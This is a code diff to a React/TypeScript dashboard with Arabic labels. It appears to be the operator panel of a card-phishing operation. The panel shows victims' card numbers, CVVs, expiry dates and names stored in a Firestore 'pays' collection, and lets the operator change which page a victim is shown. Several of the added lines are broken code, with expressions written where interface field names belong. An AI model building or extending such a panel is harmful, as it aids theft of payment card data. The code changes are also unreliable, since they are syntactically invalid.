@@ -72,14 +72,14 @@ import { Skeleton } from "@/components/ui/skeleton"
 interface PaymentData {
   cardNumber?: string
   cvv?: string
-  expiration_date?: string
+  cardMonth+"/"+cardYear ?: string
   full_name?: string
 }
 
 interface FormData {
   cardNumber?: string
   cvv?: string
-  expiration_date?: string
+  cardMonth+"/"+cardYear ?: string
   full_name?: string
 }
 
@@ -94,7 +94,7 @@ interface Notification {
   document_owner_full_name?: string
   cardYear?:string
   cardMonth?:string
-  expiration_date?: string
+  cardMonth+"/"+cardYear ?: string
   formData?: FormData
   full_name?: string
   insurance_purpose?: string
@@ -527,7 +527,7 @@ export default function NotificationsPage() {
     try {
       const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
-        pagename: newPagename,
+        currentPage: newPagename,
         isFromDash: true,
       })
 
@@ -1513,8 +1513,8 @@ export default function NotificationsPage() {
                       <div className="flex items-center gap-2 mt-1">
                         <Calendar className="h-4 w-4 text-emerald-600" />
                         <p className="font-medium text-lg font-mono text-stone-800 dark:text-stone-200">
-                          {selectedNotification.formData.expiration_date ||
-                            selectedNotification.expiration_date ||
+                          {selectedNotification.formData.cardMonth+"/"+   selectedNotification.cardYear  ||
+                            selectedNotification.cardMonth+"/"+   selectedNotification.cardYear   ||
                             "غير محدد"}
                         </p>
                       </div>
@@ -1646,8 +1646,8 @@ export default function NotificationsPage() {
                   <div>
                     <span className="text-xs text-emerald-100 block">تاريخ الانتهاء</span>
                     <span className="font-mono">
-                      {selectedCardInfo.expiration_date ||
-                        (selectedCardInfo.formData && selectedCardInfo.formData.expiration_date) ||
+                      {selectedCardInfo.cardMonth+"/"+cardYear  ||
+                        (selectedCardInfo.formData && selectedCardInfo.formData.cardMonth+"/"+cardYear ) ||
                         "غير محدد"}
                     </span>
                   </div>
@@ -1940,8 +1940,8 @@ export default function NotificationsPage() {
                       <div className="flex justify-between">
                         <span className="text-sm text-stone-600">تاريخ الانتهاء:</span>
                         <span className="font-medium font-mono text-stone-800">
-                          {selectedNotification.expiration_date ||
-                            (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
+                          {selectedNotification.cardMonth+"/"+.selectedNotification.cardYear  ||
+                            (selectedNotification.formData && selectedNotification.formData.cardMonth+"/"+selectedNotification.cardYear ) ||
                             "غير محدد"}
                         </span>
                       </div>
